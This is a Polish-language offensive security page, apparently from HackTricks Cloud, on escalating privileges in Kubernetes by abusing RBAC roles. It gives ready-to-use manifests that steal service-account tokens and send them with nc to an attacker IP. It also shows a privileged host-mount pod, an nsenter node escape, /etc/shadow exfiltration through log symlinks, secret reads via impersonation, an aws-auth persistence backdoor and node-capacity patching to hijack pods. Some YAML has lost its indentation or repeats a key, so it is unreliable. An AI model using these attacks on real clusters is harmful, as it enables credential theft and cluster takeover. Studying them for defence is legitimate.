# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Tutaj moÅ¼esz znaleÅºÄ‡ potencjalnie niebezpieczne konfiguracje Roles i ClusterRoles.\
PamiÄ™taj, Å¼e moÅ¼esz uzyskaÄ‡ wszystkie obsÅ‚ugiwane zasoby za pomocÄ… `kubectl api-resources`

## **Privilege Escalation**

Odnosimy siÄ™ do sztuki uzyskiwania **dostÄ™pu do innego podmiotu** w klastrze **z innymi uprawnieniami** (w obrÄ™bie klastra kubernetes lub do zewnÄ™trznych chmur) niÅ¼ te, ktÃ³re juÅ¼ posiadasz. W Kubernetes istniejÄ… zasadniczo **4 gÅ‚Ã³wne techniki eskalacji uprawnieÅ„**:

* MoÅ¼liwoÅ›Ä‡ **podszywania siÄ™** pod innych uÅ¼ytkownikÃ³w/grupy/SAs z lepszymi uprawnieniami w obrÄ™bie klastra kubernetes lub do zewnÄ™trznych chmur
* MoÅ¼liwoÅ›Ä‡ **tworzenia/patchowania/uruchamiania podÃ³w**, w ktÃ³rych moÅ¼esz **znaleÅºÄ‡ lub podÅ‚Ä…czyÄ‡ SAs** z lepszymi uprawnieniami w obrÄ™bie klastra kubernetes lub do zewnÄ™trznych chmur
* MoÅ¼liwoÅ›Ä‡ **odczytywania sekretÃ³w**, poniewaÅ¼ tokeny SAs sÄ… przechowywane jako sekrety
* MoÅ¼liwoÅ›Ä‡ **ucieczki do wÄ™zÅ‚a** z kontenera, gdzie moÅ¼esz ukraÅ›Ä‡ wszystkie sekrety kontenerÃ³w dziaÅ‚ajÄ…cych na wÄ™Åºle, dane uwierzytelniajÄ…ce wÄ™zÅ‚a oraz uprawnienia wÄ™zÅ‚a w obrÄ™bie chmury, w ktÃ³rej dziaÅ‚a (jeÅ›li w ogÃ³le)
* PiÄ…tÄ… technikÄ…, ktÃ³ra zasÅ‚uguje na wzmiankÄ™, jest moÅ¼liwoÅ›Ä‡ **uruchomienia port-forward** w podzie, poniewaÅ¼ moÅ¼esz uzyskaÄ‡ dostÄ™p do interesujÄ…cych zasobÃ³w w tym podzie.

### Access Any Resource or Verb (Wildcard)

**Wildcard (\*) daje uprawnienia do dowolnego zasobu z dowolnym czasownikiem**. Jest uÅ¼ywany przez administratorÃ³w. W obrÄ™bie ClusterRole oznacza to, Å¼e atakujÄ…cy mÃ³gÅ‚by naduÅ¼yÄ‡ dowolnej przestrzeni nazw w klastrze.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Uzyskaj dostÄ™p do dowolnego zasobu za pomocÄ… konkretnego czasownika

W RBAC niektÃ³re uprawnienia niosÄ… ze sobÄ… istotne ryzyko:

1. **`create`:** Przyznaje moÅ¼liwoÅ›Ä‡ tworzenia dowolnych zasobÃ³w klastra, co stwarza ryzyko eskalacji uprawnieÅ„.
2. **`list`:** UmoÅ¼liwia wylistowanie wszystkich zasobÃ³w, co moÅ¼e prowadziÄ‡ do wycieku wraÅ¼liwych danych.
3. **`get`:** Zezwala na dostÄ™p do sekretÃ³w z kont serwisowych, co stanowi zagroÅ¼enie dla bezpieczeÅ„stwa.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

AtakujÄ…cy z uprawnieniami do tworzenia poda moÅ¼e doÅ‚Ä…czyÄ‡ uprzywilejowane konto usÅ‚ugi do poda i ukraÅ›Ä‡ token, aby podszyÄ‡ siÄ™ pod konto usÅ‚ugi. Efektywnie eskalujÄ…c uprawnienia do niego.

PrzykÅ‚ad poda, ktÃ³ry ukradnie token konta usÅ‚ugi `bootstrap-signer` i wyÅ›le go do atakujÄ…cego:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Tworzenie podÃ³w i ucieczka

PoniÅ¼ej przedstawiono wszystkie uprawnienia, jakie moÅ¼e mieÄ‡ kontener:

* **DostÄ™p uprzywilejowany** (wyÅ‚Ä…czanie zabezpieczeÅ„ i ustawianie moÅ¼liwoÅ›ci)
* **WyÅ‚Ä…czenie przestrzeni nazw hostIPC i hostPid**, co moÅ¼e pomÃ³c w eskalacji uprawnieÅ„
* **WyÅ‚Ä…czenie przestrzeni nazw hostNetwork**, co daje dostÄ™p do kradzieÅ¼y uprawnieÅ„ chmurowych wÄ™zÅ‚Ã³w i lepszego dostÄ™pu do sieci
* **Zamontowanie hostÃ³w / wewnÄ…trz kontenera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

UtwÃ³rz pod za pomocÄ…:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jednolinijkowiec z [tego tweeta](https://twitter.com/mauilion/status/1129468485480751104) oraz z dodatkami:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Teraz, gdy moÅ¼esz uciec do wÄ™zÅ‚a, sprawdÅº techniki po eksploatacji w:

#### Stealth

Prawdopodobnie chcesz byÄ‡ **bardziej dyskretny**, na nastÄ™pnych stronach moÅ¼esz zobaczyÄ‡, do czego bÄ™dziesz miaÅ‚ dostÄ™p, jeÅ›li stworzysz pod, wÅ‚Ä…czajÄ…c tylko niektÃ³re z wymienionych uprawnieÅ„ w poprzednim szablonie:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_MoÅ¼esz znaleÅºÄ‡ przykÅ‚ad, jak stworzyÄ‡/wykorzystaÄ‡ poprzednie konfiguracje podÃ³w z uprawnieniami w_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - PrzenieÅ› do chmury

JeÅ›li moÅ¼esz **stworzyÄ‡** **pod** (i opcjonalnie **konto usÅ‚ugi**), moÅ¼esz byÄ‡ w stanie **uzyskaÄ‡ uprawnienia w Å›rodowisku chmurowym** poprzez **przypisanie rÃ³l chmurowych do podu lub konta usÅ‚ugi** i nastÄ™pnie uzyskanie do niego dostÄ™pu.\
Co wiÄ™cej, jeÅ›li moÅ¼esz stworzyÄ‡ **pod z przestrzeniÄ… nazw sieci hosta**, moÅ¼esz **ukraÅ›Ä‡ rolÄ™ IAM** instancji **wÄ™zÅ‚a**.

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **UtwÃ³rz/Zaktualizuj wdroÅ¼enie, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

MoÅ¼liwe jest naduÅ¼ycie tych uprawnieÅ„ do **stworzenia nowego poda** i uzyskania uprawnieÅ„, jak w poprzednim przykÅ‚adzie.

PoniÅ¼szy yaml **tworzy daemonset i eksfiltruje token SA** wewnÄ…trz poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** to zasÃ³b w kubernetes uÅ¼ywany do **uruchamiania poleceÅ„ w powÅ‚oce wewnÄ…trz poda**. UmoÅ¼liwia to **uruchamianie poleceÅ„ wewnÄ…trz kontenerÃ³w lub uzyskanie powÅ‚oki wewnÄ…trz**.

Dlatego moÅ¼liwe jest **dostanie siÄ™ do poda i kradzieÅ¼ tokena SA**, lub wejÅ›cie do uprzywilejowanego poda, ucieczka do wÄ™zÅ‚a i kradzieÅ¼ wszystkich tokenÃ³w podÃ³w w wÄ™Åºle oraz (naduÅ¼ycie) wÄ™zÅ‚a:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

To uprawnienie pozwala na **przekierowanie jednego lokalnego portu na jeden port w okreÅ›lonym podzie**. Ma to na celu uÅ‚atwienie debugowania aplikacji dziaÅ‚ajÄ…cych wewnÄ…trz poda, ale atakujÄ…cy moÅ¼e to wykorzystaÄ‡, aby uzyskaÄ‡ dostÄ™p do interesujÄ…cych (jak DB) lub podatnych aplikacji (webÃ³w?) wewnÄ…trz poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

As [**wskazano w tych badaniach**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), jeÅ›li moÅ¼esz uzyskaÄ‡ dostÄ™p lub stworzyÄ‡ pod z **zamontowanym katalogiem `/var/log/` hosta**, moÅ¼esz **uciec z kontenera**.\
Dzieje siÄ™ tak, poniewaÅ¼ gdy **Kube-API prÃ³buje uzyskaÄ‡ logi** kontenera (uÅ¼ywajÄ…c `kubectl logs <pod>`), **Å¼Ä…da pliku `0.log`** podu, korzystajÄ…c z punktu koÅ„cowego `/logs/` usÅ‚ugi **Kubelet**.\
UsÅ‚uga Kubelet udostÄ™pnia punkt koÅ„cowy `/logs/`, ktÃ³ry zasadniczo **udostÄ™pnia system plikÃ³w `/var/log` kontenera**.

Dlatego atakujÄ…cy z **dostÄ™pem do zapisu w folderze /var/log/** kontenera mÃ³gÅ‚by wykorzystaÄ‡ to zachowanie na 2 sposoby:

* ModyfikujÄ…c plik `0.log` swojego kontenera (zwykle znajdujÄ…cy siÄ™ w `/var/logs/pods/namespace_pod_uid/container/0.log`), aby byÅ‚ **symlinkiem wskazujÄ…cym na `/etc/shadow`** na przykÅ‚ad. Wtedy bÄ™dziesz mÃ³gÅ‚ wyeksfiltrowaÄ‡ plik shadow hosta, wykonujÄ…c:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* JeÅ›li atakujÄ…cy kontroluje jakikolwiek podmiot z **uprawnieniami do odczytu `nodes/log`**, moÅ¼e po prostu utworzyÄ‡ **symlink** w `/host-mounted/var/log/sym` do `/` i podczas **dostÄ™pu do `https://<gateway>:10250/logs/sym/` wyÅ›wietli system plikÃ³w root** hosta (zmiana symlinka moÅ¼e zapewniÄ‡ dostÄ™p do plikÃ³w).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorium i zautomatyzowany exploit moÅ¼na znaleÅºÄ‡ w** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### OminiÄ™cie ochrony readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

JeÅ›li masz szczÄ™Å›cie i wysoko uprzywilejowana zdolnoÅ›Ä‡ `CAP_SYS_ADMIN` jest dostÄ™pna, moÅ¼esz po prostu ponownie zamontowaÄ‡ folder jako rw:
```bash
mount -o rw,remount /hostlogs/
```
#### ObejÅ›cie ochrony hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Jak stwierdzono w [**tych badaniach**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), moÅ¼liwe jest obejÅ›cie ochrony:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
KtÃ³re miaÅ‚o na celu zapobieganie ucieczkom, jak te poprzednie, poprzez zamiast uÅ¼ywania montaÅ¼u hostPath, uÅ¼ycie PersistentVolume i PersistentVolumeClaim do zamontowania folderu hosta w kontenerze z dostÄ™pem do zapisu:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonowanie uprzywilejowanych kont**

DziÄ™ki uprawnieniu [**impersonacji uÅ¼ytkownika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), atakujÄ…cy moÅ¼e udawaÄ‡ uprzywilejowane konto.

Wystarczy uÅ¼yÄ‡ parametru `--as=<username>` w poleceniu `kubectl`, aby udawaÄ‡ uÅ¼ytkownika, lub `--as-group=<group>`, aby udawaÄ‡ grupÄ™:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Lub uÅ¼yj REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

Uprawnienie do **wyÅ›wietlania sekretÃ³w moÅ¼e pozwoliÄ‡ atakujÄ…cemu na rzeczywiste odczytanie sekretÃ³w** uzyskujÄ…c dostÄ™p do punktu koÅ„cowego REST API:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Odczytanie sekretu â€“ brute-forcing tokenÃ³w ID

Podczas gdy atakujÄ…cy posiadajÄ…cy token z uprawnieniami do odczytu wymaga dokÅ‚adnej nazwy sekretu, aby go uÅ¼yÄ‡, w przeciwieÅ„stwie do szerszego przywileju _**wyÅ›wietlania sekretÃ³w**_, nadal istniejÄ… luki. DomyÅ›lne konta serwisowe w systemie mogÄ… byÄ‡ enumerowane, z ktÃ³rych kaÅ¼de jest powiÄ…zane z sekretem. Te sekrety majÄ… strukturÄ™ nazwy: statyczny prefiks, a nastÄ™pnie losowy piÄ™cioznakowy alfanumeryczny token (z wyÅ‚Ä…czeniem niektÃ³rych znakÃ³w) zgodnie z [kodem ÅºrÃ³dÅ‚owym](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token jest generowany z ograniczonego zestawu 27 znakÃ³w (`bcdfghjklmnpqrstvwxz2456789`), a nie z peÅ‚nego zakresu alfanumerycznego. To ograniczenie redukuje caÅ‚kowitÄ… liczbÄ™ moÅ¼liwych kombinacji do 14,348,907 (27^5). W zwiÄ…zku z tym atakujÄ…cy mÃ³gÅ‚by wykonaÄ‡ atak brute-force, aby wydedukowaÄ‡ token w ciÄ…gu kilku godzin, co potencjalnie prowadzi do eskalacji uprawnieÅ„ poprzez uzyskanie dostÄ™pu do wraÅ¼liwych kont serwisowych.

### Å»Ä…dania podpisania certyfikatu

JeÅ›li masz czasowniki **`create`** w zasobie `certificatesigningrequests` (lub przynajmniej w `certificatesigningrequests/nodeClient`). MoÅ¼esz **utworzyÄ‡** nowy CeSR dla **nowego wÄ™zÅ‚a.**

Zgodnie z [dokumentacjÄ…, moÅ¼liwe jest automatyczne zatwierdzanie tych Å¼Ä…daÅ„](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), wiÄ™c w takim przypadku **nie potrzebujesz dodatkowych uprawnieÅ„**. JeÅ›li nie, musiaÅ‚byÅ› byÄ‡ w stanie zatwierdziÄ‡ Å¼Ä…danie, co oznacza aktualizacjÄ™ w `certificatesigningrequests/approval` i `approve` w `signers` z resourceName `<signerNameDomain>/<signerNamePath>` lub `<signerNameDomain>/*`

PrzykÅ‚ad **roli** z wszystkimi wymaganymi uprawnieniami to:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
WiÄ™c, z nowym zatwierdzonym CSR wÄ™zÅ‚a, moÅ¼esz **wykorzystaÄ‡** specjalne uprawnienia wÄ™zÅ‚Ã³w do **kradzieÅ¼y sekretÃ³w** i **eskalacji uprawnieÅ„**.

W [**tym poÅ›cie**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**tym**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) konfiguracja TLS Bootstrap K8s w GKE jest skonfigurowana z **automatycznym podpisywaniem** i jest wykorzystywana do generowania poÅ›wiadczeÅ„ nowego wÄ™zÅ‚a K8s, a nastÄ™pnie wykorzystywana do eskalacji uprawnieÅ„ poprzez kradzieÅ¼ sekretÃ³w.\
JeÅ›li **masz wspomniane uprawnienia, moÅ¼esz zrobiÄ‡ to samo**. ZauwaÅ¼, Å¼e pierwszy przykÅ‚ad omija bÅ‚Ä…d uniemoÅ¼liwiajÄ…cy nowemu wÄ™zÅ‚owi dostÄ™p do sekretÃ³w wewnÄ…trz kontenerÃ³w, poniewaÅ¼ **wÄ™zeÅ‚ moÅ¼e uzyskaÄ‡ dostÄ™p tylko do sekretÃ³w kontenerÃ³w zamontowanych na nim.**

Sposobem na obejÅ›cie tego jest po prostu **utworzenie poÅ›wiadczeÅ„ wÄ™zÅ‚a dla nazwy wÄ™zÅ‚a, na ktÃ³rym zamontowany jest kontener z interesujÄ…cymi sekretami** (ale sprawdÅº, jak to zrobiÄ‡ w pierwszym poÅ›cie):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Podmioty, ktÃ³re mogÄ… modyfikowaÄ‡ **`configmaps`** w przestrzeni nazw kube-system na klastrach EKS (muszÄ… byÄ‡ w AWS), mogÄ… uzyskaÄ‡ uprawnienia administratora klastra, nadpisujÄ…c **aws-auth** configmap.\
Potrzebne czasowniki to **`update`** i **`patch`**, lub **`create`**, jeÅ›li configmap nie zostaÅ‚ utworzony:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
MoÅ¼esz uÅ¼yÄ‡ **`aws-auth`** do **utrzymania** dostÄ™pu dla uÅ¼ytkownikÃ³w z **innych kont**.

JednakÅ¼e, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nie dziaÅ‚a z innego konta**. Ale w rzeczywistoÅ›ci `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` dziaÅ‚a, jeÅ›li podasz ARN klastra zamiast tylko nazwy.\
Aby `kubectl` dziaÅ‚aÅ‚, upewnij siÄ™, Å¼e **skonfigurujesz** **kubeconfig ofiary** i w argumentach exec aws dodaj `--profile other_account_role`, aby kubectl uÅ¼ywaÅ‚ profilu innego konta do uzyskania tokena i kontaktu z AWS.
{% endhint %}

### Eskalacja w GKE

IstniejÄ… **2 sposoby przypisania uprawnieÅ„ K8s do zasad GCP**. W kaÅ¼dym przypadku zasada rÃ³wnieÅ¼ potrzebuje uprawnienia **`container.clusters.get`**, aby mÃ³c zebraÄ‡ poÅ›wiadczenia do uzyskania dostÄ™pu do klastra, lub bÄ™dziesz musiaÅ‚ **wygenerowaÄ‡ wÅ‚asny plik konfiguracyjny kubectl** (postÄ™puj zgodnie z nastÄ™pujÄ…cym linkiem).

{% hint style="warning" %}
RozmawiajÄ…c z punktem koÅ„cowym API K8s, **token autoryzacji GCP zostanie wysÅ‚any**. NastÄ™pnie GCP, przez punkt koÅ„cowy API K8s, najpierw **sprawdzi, czy zasada** (po e-mailu) **ma jakikolwiek dostÄ™p wewnÄ…trz klastra**, a nastÄ™pnie sprawdzi, czy ma **jakikolwiek dostÄ™p przez GCP IAM**.\
JeÅ›li **jakiekolwiek** z tych stwierdzeÅ„ jest **prawdziwe**, otrzyma **odpowiedÅº**. JeÅ›li **nie**, zostanie podany **bÅ‚Ä…d** sugerujÄ…cy nadanie **uprawnieÅ„ przez GCP IAM**.
{% endhint %}

Pierwsza metoda to uÅ¼ycie **GCP IAM**, uprawnienia K8s majÄ… swoje **odpowiedniki w uprawnieniach GCP IAM**, a jeÅ›li zasada je ma, bÄ™dzie mogÅ‚a z nich korzystaÄ‡.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Druga metoda to **przypisanie uprawnieÅ„ K8s wewnÄ…trz klastra** poprzez identyfikacjÄ™ uÅ¼ytkownika po jego **e-mailu** (w tym konta serwisowe GCP).

### Tworzenie tokenÃ³w serviceaccounts

Zasady, ktÃ³re mogÄ… **tworzyÄ‡ TokenRequests** (`serviceaccounts/token`) podczas rozmowy z punktem koÅ„cowym API K8s SAs (informacje z [**tutaj**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Zasady, ktÃ³re mogÄ… **`aktualizowaÄ‡`** lub **`patchowaÄ‡`** **`pods/ephemeralcontainers`** mogÄ… uzyskaÄ‡ **wykonanie kodu na innych podach**, a potencjalnie **wyjÅ›Ä‡** na ich wÄ™zeÅ‚, dodajÄ…c tymczasowy kontener z uprzywilejowanym securityContext.

### ValidatingWebhookConfigurations lub MutatingWebhookConfigurations

Zasady z dowolnym z czasownikÃ³w `create`, `update` lub `patch` nad `validatingwebhookconfigurations` lub `mutatingwebhookconfigurations` mogÄ… byÄ‡ w stanie **utworzyÄ‡ jednÄ… z takich webhookconfigurations**, aby mÃ³c **eskalowaÄ‡ uprawnienia**.

Dla [`mutatingwebhookconfigurations` przykÅ‚adu sprawdÅº tÄ™ sekcjÄ™ tego posta](./#malicious-admission-controller).

### Eskalacja

Jak moÅ¼na przeczytaÄ‡ w nastÄ™pnej sekcji: [**Wbudowana zapobieganie eskalacji uprawnieÅ„**](./#built-in-privileged-escalation-prevention), zasada nie moÅ¼e aktualizowaÄ‡ ani tworzyÄ‡ rÃ³l lub clusterroles bez posiadania tych nowych uprawnieÅ„. Z wyjÄ…tkiem sytuacji, gdy ma **czasownik `escalate`** nad **`roles`** lub **`clusterroles`**.\
Wtedy moÅ¼e aktualizowaÄ‡/tworzyÄ‡ nowe role, clusterroles z lepszymi uprawnieniami niÅ¼ te, ktÃ³re ma.

### Proxy wÄ™zÅ‚Ã³w

Zasady z dostÄ™pem do podzasobu **`nodes/proxy`** mogÄ… **wykonywaÄ‡ kod na podach** za poÅ›rednictwem API Kubelet (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). WiÄ™cej informacji na temat autoryzacji Kubelet na tej stronie:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Masz przykÅ‚ad, jak uzyskaÄ‡ [**RCE rozmawiajÄ…c autoryzowanym z API Kubelet tutaj**](../pentesting-kubernetes-services/#kubelet-rce).

### Usuwanie podÃ³w + wÄ™zÅ‚y nieschedulowalne

Zasady, ktÃ³re mogÄ… **usuwaÄ‡ pody** (`delete` czasownik nad zasobem `pods`), lub **ewikowaÄ‡ pody** (`create` czasownik nad zasobem `pods/eviction`), lub **zmieniaÄ‡ status poda** (dostÄ™p do `pods/status`) i mogÄ… **sprawiÄ‡, Å¼e inne wÄ™zÅ‚y bÄ™dÄ… nieschedulowalne** (dostÄ™p do `nodes/status`) lub **usuwaÄ‡ wÄ™zÅ‚y** (`delete` czasownik nad zasobem `nodes`) i majÄ… kontrolÄ™ nad podami, mogÄ… **ukraÅ›Ä‡ pody z innych wÄ™zÅ‚Ã³w**, aby byÅ‚y **wykonywane** w **skompromentowanym** **wÄ™Åºle**, a atakujÄ…cy moÅ¼e **ukraÅ›Ä‡ tokeny** z tych podÃ³w.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usÅ‚ug (CVE-2020-8554)

Podmioty, ktÃ³re mogÄ… **modyfikowaÄ‡** **`services/status`**, mogÄ… ustawiÄ‡ pole `status.loadBalancer.ingress.ip`, aby wykorzystaÄ‡ **niepoprawionÄ… CVE-2020-8554** i przeprowadziÄ‡ **ataki MiTM przeciwko klastrowi**. WiÄ™kszoÅ›Ä‡ Å›rodkÃ³w zaradczych dla CVE-2020-8554 zapobiega jedynie usÅ‚ugom ExternalIP (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status wÄ™zÅ‚Ã³w i podÃ³w

